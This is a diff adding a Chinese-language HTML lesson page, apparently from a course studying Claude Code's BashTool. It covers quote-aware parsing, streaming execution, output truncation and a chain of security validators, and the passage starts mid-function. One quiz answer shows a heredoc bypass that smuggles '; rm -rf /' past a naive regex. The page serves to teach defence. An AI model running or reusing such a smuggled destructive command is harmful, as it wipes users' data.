+      unquotedKeepQuoteChars += char
+    }
+  }
+
+  return { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars }
+}</code></pre>
+          </div>
+
+          <div class="accordion" data-group="code-anno-quote">
+            <div class="accordion-header" aria-expanded="false">
+              <span style="font-weight: 700; color: var(--text-heading);">📋 三种提取结果的用途（点击展开）</span>
+              <svg class="accordion-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="accordion-body">
+              <div class="accordion-content">
+                <table class="code-anno-table">
+                  <thead><tr><th>视图</th><th>用途</th></tr></thead>
+                  <tbody>
+                    <tr><td>withDoubleQuotes</td><td>检测双引号内的命令替换（双引号不阻止 <code>$()</code>）</td></tr>
+                    <tr><td>fullyUnquoted</td><td>检测真正在引号外的危险字符（如未引用的管道符、重定向符）</td></tr>
+                    <tr><td>unquotedKeepQuoteChars</td><td>检测 <code>'x'#</code>（引号字符紧邻注释符）这类微妙注入</td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <div class="callout callout-tip" style="margin-top: var(--space-lg);">
+            <div class="callout-title"><span>💡</span> 设计点评 — 三视图解析的精确性</div>
+            <p style="font-size: var(--font-size-sm); color: var(--text-secondary); margin-top: var(--space-sm); line-height: 1.8;">
+              <strong>好在哪里</strong>：<code>extractQuotedContent</code> 把一条命令分解成三个"解读视角"，每种视角针对不同的安全检查场景。就像拍照片用不同滤镜看同一场景——有些危险在白光下看不出来，但在紫外线滤镜下一目了然。三视图消除了"引号歧义"对安全判断的干扰。
+            </p>
+            <p style="font-size: var(--font-size-sm); color: var(--text-secondary); margin-top: var(--space-sm); line-height: 1.8;">
+              <strong>如果不这样做</strong>：直接在原始命令字符串上用正则检测危险字符，会产生大量误报（单引号内的 <code>$()</code> 被误判为命令替换）和漏报（双引号内的 <code>$()</code> 被忽略），安全检查的准确率会大幅下降。
+            </p>
+          </div>
+        </div>
+
+        <!-- 3.5 流式执行 -->
+        <div id="code-stream" class="reveal">
+          <h3 class="content-h3">3.5 流式执行与进度回调（BashTool.tsx 执行逻辑）</h3>
+          <div style="display: flex; gap: var(--space-sm); flex-wrap: wrap; margin-bottom: var(--space-md);">
+            <span class="pattern-badge">⏱ 2秒进度阈值</span>
+            <span class="pattern-badge">💾 大输出落盘</span>
+            <span class="pattern-badge">🔚 末尾保留截断</span>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header">
+              <div class="code-block-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
+              <span class="code-block-lang">TypeScript · BashTool.tsx · 执行核心</span>
+              <button class="code-copy-btn" aria-label="复制代码">复制</button>
+            </div>
+            <pre><code class="language-typescript">const PROGRESS_THRESHOLD_MS = 2000  // 2秒后显示进度
+const ASSISTANT_BLOCKING_BUDGET_MS = 15_000  // 15秒后自动后台化
+
+async function* runBashCommand(command, timeout, context, onProgress) {
+  const startTime = Date.now()
+  let outputAccumulator = new EndTruncatingAccumulator(MAX_OUTPUT_SIZE)
+
+  const result = await exec(command, {
+    timeout,
+    cwd: getCurrentCwd(),
+    onStdout: (chunk) =&gt; {
+      outputAccumulator.append(chunk)
+      const elapsed = Date.now() - startTime
+      if (elapsed &gt; PROGRESS_THRESHOLD_MS) {
+        // 超过 2 秒，开始显示实时进度
+        onProgress({
+          toolUseID: context.toolUseID,
+          data: { type: 'bash_progress', stdout: outputAccumulator.getPreview(), elapsed }
+        })
+      }
+    },
+  })
+
+  const output = outputAccumulator.getResult()
+
+  // 大结果落盘策略
+  if (output.length &gt; maxResultSizeChars) {
+    const resultPath = await persistLargeOutput(output)
+    return { data: { stdout: generatePreview(output), resultFilePath: resultPath, truncated: true } }
+  }
+
+  return { data: { stdout: output, stderr: result.stderr } }
+}</code></pre>
+          </div>
+
+          <div class="mermaid-container" style="margin-top: var(--space-lg);">
+            <div class="mermaid">
+sequenceDiagram
+  participant BT as BashTool
+  participant Exec as Shell 进程
+  participant UI as 进度 UI
+
+  BT->>Exec: 启动命令（带超时/信号）
+  loop 执行中
+    Exec-->>BT: stdout 分片（实时）
+    BT->>BT: 累积到 accumulator
+    alt 超过 2 秒
+      BT->>UI: onProgress({preview, elapsed})
+      UI-->>User: 显示实时输出预览
+    end
+  end
+  Exec-->>BT: 执行完成（exitCode, stdout, stderr）
+  alt 输出超大
+    BT->>Disk: 写入大结果文件
+    BT->>UI: 返回预览 + 文件路径
+  else 正常大小
+    BT->>UI: 返回完整输出
+  end
+            </div>
+          </div>
+
+          <div class="callout callout-tip" style="margin-top: var(--space-lg);">
+            <div class="callout-title"><span>💡</span> 设计点评 — 2秒进度阈值与大输出落盘</div>
+            <p style="font-size: var(--font-size-sm); color: var(--text-secondary); margin-top: var(--space-sm); line-height: 1.8;">
+              <strong>好在哪里</strong>：两个设计相互配合——2秒阈值避免了短命令闪烁进度条（快速命令在2秒内完成，用户根本看不到进度 UI）；大输出落盘让模型能知道"完整结果在哪儿"而不是被截断的输出。两者都是以"用户感知"为优先的设计，而非单纯追求技术完整性。
+            </p>
+            <p style="font-size: var(--font-size-sm); color: var(--text-secondary); margin-top: var(--space-sm); line-height: 1.8;">
+              <strong>如果不这样做</strong>：如果没有2秒阈值，每个命令都立即显示进度条，UI 会频繁闪烁，体验很差。如果大输出直接截断不落盘，模型可能在截断的输出上做错误判断，不知道还有更多内容。
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- §4 Harness Engineering -->
+      <section class="content-section" id="harness">
+        <div class="reveal">
+          <p class="section-label">Section 04</p>
+          <h2 class="content-h2">Harness Engineering</h2>
+        </div>
+
+        <div class="reveal">
+          <p class="content-p">
+            BashTool 是驾驭层（Harness Layer）中最典型的能力-风险平衡案例：Shell 命令是 AI 最强大的能力，也是最危险的工具，驾驭层在这里构建了最复杂的多层防护。
+          </p>
+
+          <div class="code-block" style="margin-bottom: var(--space-lg);">
+            <div class="code-block-header">
+              <div class="code-block-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
+              <span class="code-block-lang">TypeScript · 安全检查链作为能力控制门</span>
+            </div>
+            <pre><code class="language-typescript">// 驾驭层：每个验证器代表一种风险维度的控制
+const SECURITY_VALIDATORS = [
+  validateEmpty,                  // 控制：空命令直接放行
+  validateIncompleteCommands,     // 控制：语法不完整时拒绝执行
+  isSafeHeredoc,                  // 控制：可证明安全的模式直接放行
+  validateCommandSubstitution,    // 控制：命令嵌套执行需确认
+  validateZshDangerousCommands,   // 控制：Shell 特有危险扩展阻断
+  validateRedirections,           // 控制：重定向注入检测
+]</code></pre>
+          </div>
+
+          <div class="card reveal" style="margin-bottom: var(--space-lg); border-left: 4px solid var(--accent-blue);">
+            <div style="display: flex; align-items: flex-start; gap: var(--space-md);">
+              <div style="font-size: 32px; flex-shrink: 0;">🛡️</div>
+              <div>
+                <h4 style="font-size: var(--font-size-md); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-sm);">启发 1：纵深防御优于单一检查</h4>
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">不要试图用一个"完美的"安全规则覆盖所有情况，而是设计多个独立检查器，每个只负责一类风险。漏过第一层的威胁，下一层接住。安全检查是"与"逻辑，全部通过才允许。</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="card reveal" style="margin-bottom: var(--space-lg); border-left: 4px solid var(--accent-green);">
+            <div style="display: flex; align-items: flex-start; gap: var(--space-md);">
+              <div style="font-size: 32px; flex-shrink: 0;">🎯</div>
+              <div>
+                <h4 style="font-size: var(--font-size-md); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-sm);">启发 2：区分"AI 能力的约束"和"工具行为的约束"</h4>
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">你不应该说"AI 不能运行危险命令"——AI 不应该需要知道命令是否危险。而是在工具层面检测危险模式，让 AI 只感知"工具拒绝了某个命令"。职责分离让提示工程更简洁，安全机制更可靠。</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="card reveal" style="margin-bottom: var(--space-lg); border-left: 4px solid var(--accent-orange);">
+            <div style="display: flex; align-items: flex-start; gap: var(--space-md);">
+              <div style="font-size: 32px; flex-shrink: 0;">📊</div>
+              <div>
+                <h4 style="font-size: var(--font-size-md); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-sm);">启发 3：命令输出的信息密度影响截断策略</h4>
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">Shell 命令的末尾比开头重要：最终结果、错误信息、总结性输出都在末尾。<code>EndTruncatingAccumulator</code> 体现了"基于领域知识设计截断策略"的思路。在你自己的应用中，考虑不同类型内容的信息密度分布，选择最优截断方向。</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="card reveal" style="margin-bottom: var(--space-lg); border-left: 4px solid var(--accent-purple);">
+            <div style="display: flex; align-items: flex-start; gap: var(--space-md);">
+              <div style="font-size: 32px; flex-shrink: 0;">🔢</div>
+              <div>
+                <h4 style="font-size: var(--font-size-md); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-sm);">启发 4：退出码语义需要显式解释层</h4>
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">不同命令的退出码含义不同（grep 的 1 是"无匹配"，而非"错误"）。在 AI 应用中，工具执行结果需要经过语义解释层才能传给模型——让模型正确理解"未找到"和"出错"的区别，避免错误的错误处理循环。</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- §5 思考题 -->
+      <section class="content-section" id="quiz">
+        <div class="reveal">
+          <p class="section-label">Section 05</p>
+          <h2 class="content-h2">思考题与进阶方向</h2>
+        </div>
+
+        <div class="reveal">
+          <h3 class="content-h3">思考题</h3>
+
+          <div class="accordion" data-group="quiz">
+            <div class="accordion-header" aria-expanded="false">
+              <span style="font-weight: 600; color: var(--text-primary);">Q1：为什么 isSafeHeredoc 使用逐行匹配而非 [\s\S]*? 正则？</span>
+              <svg class="accordion-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="accordion-body">
+              <div class="accordion-content">
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary); line-height: 1.8;">
+                  <strong>💡 参考答案</strong>：<code>[\s\S]*?</code> 是非贪婪匹配，可能被攻击者绕过：构造 <code>cat &lt;&lt;'EOF'
+contents
+EOF
+; rm -rf /
+EOF)</code> 时，正则可能"跳过"第一个 EOF，把 <code>; rm -rf /</code> 当成合法的 heredoc 内容体。逐行匹配精确复现 bash 的行为——bash 在读到"分隔符独占一行"时立即关闭 heredoc，不会继续看后面的行。逐行匹配保证了安全检查与 bash 实际解析行为完全一致，没有正则的语义偏差。
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div class="accordion" data-group="quiz">
+            <div class="accordion-header" aria-expanded="false">
+              <span style="font-weight: 600; color: var(--text-primary);">Q2：withDoubleQuotes 和 fullyUnquoted 有什么区别？各用于哪类安全检查？</span>
+              <svg class="accordion-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="accordion-body">
+              <div class="accordion-content">
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary); line-height: 1.8;">
+                  <strong>💡 参考答案</strong>：<code>withDoubleQuotes</code> 保留双引号内的内容（因为双引号内的 <code>$()</code> 仍然会被 bash 执行），但移除单引号内的内容（单引号内是字面量，不执行）。<code>fullyUnquoted</code> 同时移除两种引号内的内容，只保留完全裸露的字符。<code>withDoubleQuotes</code> 用于检测"看似安全的双引号字符串内藏命令替换"，<code>fullyUnquoted</code> 用于检测"确实在引号外面"的危险字符。错误使用会导致误报或漏报。
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div class="accordion" data-group="quiz">
+            <div class="accordion-header" aria-expanded="false">
+              <span style="font-weight: 600; color: var(--text-primary);">Q3：grep 返回码 1 代表什么语义？为什么不直接报错？</span>
+              <svg class="accordion-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="accordion-body">
+              <div class="accordion-content">
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary); line-height: 1.8;">
+                  <strong>💡 参考答案</strong>：根据 POSIX 规范，grep 的退出码含义是：0 = 找到匹配，1 = 未找到匹配，2 = 发生错误。退出码 1 是正常的"搜索结果为空"，不是程序错误。如果把退出码 1 当作错误报告给模型，模型会认为搜索"失败"了，可能尝试换用其他命令或报告"无法搜索"，而实际上只是没有匹配。<code>commandSemantics.ts</code> 的语义解释层让模型感知的是"搜索成功，结果为空"而非"命令执行失败"。
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div class="accordion" data-group="quiz">
+            <div class="accordion-header" aria-expanded="false">
+              <span style="font-weight: 600; color: var(--text-primary);">Q4：ASSISTANT_BLOCKING_BUDGET_MS = 15_000 的作用是什么？</span>
+              <svg class="accordion-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="accordion-body">
+              <div class="accordion-content">
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary); line-height: 1.8;">
+                  <strong>💡 参考答案</strong>：在助手（AI-driven）模式下，一些 Bash 命令会持续运行很长时间（如构建命令、测试套件）。如果等待超过 15 秒，Claude Code 会将这个命令转为后台运行，返回一个"命令仍在运行中"的状态，让模型可以继续处理其他任务或等待用户指令。这避免了 AI 在等待漫长操作时"卡住"，体现了驾驭层对 AI 执行时间的调度控制。
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div class="accordion" data-group="quiz">
+            <div class="accordion-header" aria-expanded="false">
+              <span style="font-weight: 600; color: var(--text-primary);">Q5：EndTruncatingAccumulator 为什么选择保留末尾而非开头？</span>
+              <svg class="accordion-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="accordion-body">
+              <div class="accordion-content">
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary); line-height: 1.8;">
+                  <strong>💡 参考答案</strong>：Shell 命令的输出通常遵循"前序初始化，后置结果"的模式：编译过程先输出各文件的编译日志，最后输出"Build failed"或"Build succeeded"；测试运行先输出每个测试的详情，最后输出"5 tests passed, 2 failed"。末尾的总结信息和最终状态对模型理解执行结果更重要。如果截断末尾，模型可能不知道最终成功还是失败。
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="reveal" style="margin-top: var(--space-xl);">
+          <h3 class="content-h3">进阶阅读方向</h3>
+          <div class="grid-2" style="gap: var(--space-md);">
+            <div class="callout callout-info">
+              <div class="callout-title"><span>🔬</span> 安全研究</div>
+              <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">阅读 <code>bashSecurity.ts</code> 中的 <code>validateIFS</code>、<code>validateMidWordHash</code>、<code>validateUnicodeWhitespace</code> 等检查器，理解每种注入向量</p>
+            </div>
+            <div class="callout callout-tip">
+              <div class="callout-title"><span>🌲</span> AST 分析</div>
+              <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">研究 <code>src/utils/bash/ast.ts</code> 中的 Tree-Sitter 集成，了解 Shell 语法的 AST 表示</p>
+            </div>
+            <div class="callout callout-idea">
+              <div class="callout-title"><span>🔧</span> sed 支持</div>
+              <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">阅读 <code>sedEditParser.ts</code>，了解 <code>sed -i 's/foo/bar/g' file.txt</code> 如何被解析为结构化的编辑操作</p>
+            </div>
+            <div class="callout callout-warning">
+              <div class="callout-title"><span>🏖️</span> 沙箱机制</div>
+              <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">研究 <code>src/utils/sandbox/sandbox-adapter.ts</code>，了解 macOS <code>sandbox-exec</code> 如何提供系统级隔离</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="reveal" style="margin-top: var(--space-xl);">
+          <div class="card" style="padding: var(--space-xl); background: linear-gradient(135deg, #eff6ff 0%, #ecfeff 100%); border-color: #bfdbfe;">
+            <h3 style="font-size: var(--font-size-lg); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-md);">📌 本课小结</h3>
+            <div class="grid-2" style="gap: var(--space-md);">
+              <div style="display: flex; gap: var(--space-sm); align-items: flex-start;">
+                <span style="color: var(--accent-green); font-size: 16px; margin-top: 2px;">✓</span>
+                <span style="font-size: var(--font-size-sm); color: var(--text-secondary);"><strong>三层防御</strong>：输入理解 → 安全检查链 → 权限决策，每层独立设计</span>
+              </div>
+              <div style="display: flex; gap: var(--space-sm); align-items: flex-start;">
+                <span style="color: var(--accent-green); font-size: 16px; margin-top: 2px;">✓</span>
+                <span style="font-size: var(--font-size-sm); color: var(--text-secondary);"><strong>早期允许路径</strong>：isSafeHeredoc 可证明安全时跳过后续检查</span>
+              </div>
+              <div style="display: flex; gap: var(--space-sm); align-items: flex-start;">
+                <span style="color: var(--accent-green); font-size: 16px; margin-top: 2px;">✓</span>
+                <span style="font-size: var(--font-size-sm); color: var(--text-secondary);"><strong>三视图解析</strong>：extractQuotedContent 消除引号歧义对安全检查的干扰</span>
+              </div>
+              <div style="display: flex; gap: var(--space-sm); align-items: flex-start;">
+                <span style="color: var(--accent-green); font-size: 16px; margin-top: 2px;">✓</span>
+                <span style="font-size: var(--font-size-sm); color: var(--text-secondary);"><strong>智能截断</strong>：EndTruncatingAccumulator 基于领域知识保留末尾关键输出</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <nav class="lesson-nav-footer" aria-label="课程导航">
+        <a href="05.html" class="nav-prev">← 上一课：工具系统架构与生命周期</a>
+        <a href="../index.html#phases" class="nav-overview">📋 返回课程总览</a>
+        <a href="07.html" class="nav-next">下一课：文件操作工具全解 →</a>
+      </nav>
+
+    </main>
+  </div>
+</div>
+
+<footer class="footer" role="contentinfo">
+  <div class="container">
+    <div class="footer-inner">
+      <div class="footer-brand">
+        <div class="brand-icon" style="width:28px; height:28px; border-radius:6px; background: var(--gradient-accent); display:flex; align-items:center; justify-content:center; font-size:14px;" aria-hidden="true">⚡</div>
+        <span>Claude Code 源码学习系列</span>
+      </div>
+      <nav class="footer-links" aria-label="页脚导航">
+        <a href="../index.html#phases">课程总览</a>
+        <a href="05.html">← 上一课</a>
+        <a href="07.html">下一课 →</a>
+      </nav>
+      <p class="footer-copy">第06课 · Shell 执行工具深度剖析 · © 2026 仅供学习研究</p>
+    </div>
+  </div>
+</footer>
+
+<script src="../js/main.js"></script>
+<script>
+(function() {
+  'use strict';
+  function initTocSpy() {
+    const tocItems = document.querySelectorAll('.toc-item');
+    const sections = document.querySelectorAll('section[id], div[id]');
+    if (!tocItems.length || !sections.length) return;
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          const id = entry.target.id;
+          tocItems.forEach(item => {
+            const link = item.querySelector('a');
+            if (link && link.getAttribute('href') === '#' + id) {
+              tocItems.forEach(i => i.classList.remove('active'));
+              item.classList.add('active');
+            }
+          });
+        }
+      });
+    }, { rootMargin: '-80px 0px -60% 0px', threshold: 0 });
+    sections.forEach(s => observer.observe(s));
+  }
+  if (document.readyState !== 'loading') { initTocSpy(); }
+  else { document.addEventListener('DOMContentLoaded', initTocSpy); }
+})();
+</script>
+
+</body>
+</html>
